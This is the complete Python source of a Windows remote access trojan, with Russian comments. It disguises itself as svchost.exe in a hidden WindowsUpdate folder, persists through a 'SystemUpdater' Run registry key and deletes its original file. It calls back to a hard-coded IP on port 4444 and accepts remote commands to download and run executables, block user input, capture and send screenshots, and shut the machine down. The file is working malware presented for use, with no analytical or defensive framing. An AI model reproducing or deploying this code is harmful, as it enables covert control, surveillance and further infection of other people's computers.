import os, sys, socket, json, time, shutil, subprocess, ctypes, base64, tempfile
import threading

# Для скриншотов
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

SERVER_HOST = '204.12.227.173'
SERVER_PORT = 4444

# Переменная для хранения состояния блокировки (не обязательна)
blocked = False

def add_to_startup():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except:
        pass

def copy_to_system():
    target_dir = os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'WindowsUpdate')
    if not os.path.exists(target_dir):
        try:
            os.makedirs(target_dir)
        except:
            pass
    target = os.path.join(target_dir, 'svchost.exe')
    current = sys.executable
    if os.path.abspath(current) == os.path.abspath(target):
        return target
    try:
        shutil.copy2(current, target)
        ctypes.windll.kernel32.SetFileAttributesW(target, 2)
        return target
    except Exception as e:
        print(f"Ошибка копирования: {e}")
        return None

def delete_original():
    current = sys.executable
    target = os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'WindowsUpdate', 'svchost.exe')
    if os.path.abspath(current) != os.path.abspath(target):
        bat = os.path.join(tempfile.gettempdir(), 'del.bat')
        try:
            with open(bat, 'w') as f:
                f.write(f'@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q "{current}"\ndel /f /q "{bat}"\n')
            subprocess.Popen(bat, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def self_uninstall():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "SystemUpdater")
        winreg.CloseKey(key)
    except:
        pass
    current = sys.executable
    bat = os.path.join(tempfile.gettempdir(), 'uninstall.bat')
    try:
        with open(bat, 'w') as f:
            f.write(f'@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q "{current}"\ndel /f /q "{bat}"\n')
        subprocess.Popen(bat, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    sys.exit(0)

def send_screenshot(sock):
    """Сделать скриншот и отправить через сокет"""
    if ImageGrab is None:
        return
    try:
        img = ImageGrab.grab()
        # конвертируем в PNG в памяти
        import io
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        img_data = buf.getvalue()
        b64_data = base64.b64encode(img_data).decode()
        msg = json.dumps({"type": "screenshot_response", "data": b64_data})
        sock.sendall((msg + "\n").encode())
    except Exception as e:
        print(f"Ошибка скриншота: {e}")

def main():
    # Само-копирование и запуск копии
    target = copy_to_system()
    if target and os.path.abspath(sys.executable) != os.path.abspath(target):
        try:
            subprocess.Popen(target, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        delete_original()
        sys.exit(0)

    add_to_startup()

    # Подключение к серверу
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            name = os.environ.get('COMPUTERNAME', 'UnknownPC')
            s.sendall(json.dumps({"type": "client", "name": name}).encode())
            break
        except:
            time.sleep(10)

    # Цикл приёма команд
    while True:
        try:
            data = s.recv(4096).decode()
            if not data:
                break
            for line in data.split('\n'):
                line = line.strip()
                if not line:
                    continue
                try:
                    cmd = json.loads(line)
                    c = cmd.get('cmd')
                    d = cmd.get('data')
                    if c == 'download_and_run':
                        fn = d.get('filename', 'app.exe')
                        cnt = base64.b64decode(d.get('content', ''))
                        if cnt:
                            path = os.path.join(tempfile.gettempdir(), fn)
                            with open(path, 'wb') as f:
                                f.write(cnt)
                            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
                    elif c == 'block_input':
                        ctypes.windll.user32.BlockInput(True)
                        # запоминаем, что заблокировано (для уведомления)
                    elif c == 'unblock_input':
                        ctypes.windll.user32.BlockInput(False)
                    elif c == 'screenshot':
                        # запускаем в отдельном потоке, чтобы не блокировать приём команд
                        threading.Thread(target=send_screenshot, args=(s,), daemon=True).start()
                    elif c == 'shutdown':
                        os.system('shutdown /s /t 0')
                    elif c == 'uninstall':
                        self_uninstall()
                except:
                    pass
        except:
            time.sleep(5)
            break
    # Если вышли из цикла, перезапускаем подключение
    main()

if __name__ == "__main__":
    main()